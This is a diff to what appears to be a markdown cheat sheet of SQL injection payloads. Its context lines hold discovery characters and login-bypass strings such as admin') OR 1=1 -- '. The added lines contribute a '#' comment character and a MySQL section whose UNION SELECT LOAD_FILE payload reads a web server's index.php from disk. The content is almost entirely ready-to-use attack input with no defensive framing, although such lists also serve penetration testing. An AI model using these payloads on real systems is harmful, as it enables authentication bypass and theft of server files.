@@ -14,6 +14,7 @@ Good payload to for discovery is :
     )
     *
     --
+    #
 
 Logic Testing
 
@@ -28,6 +29,14 @@ Logic Testing
     admin')-- -
     admin') OR 1=1 -- '
 
+
+## Sql injection mysql
+
+When we find a sql injection we can try to load files:
+
+```
+data' union select LOAD_FILE('/var/www/html/index.php')-- -
+```
 
 ## More Information
 
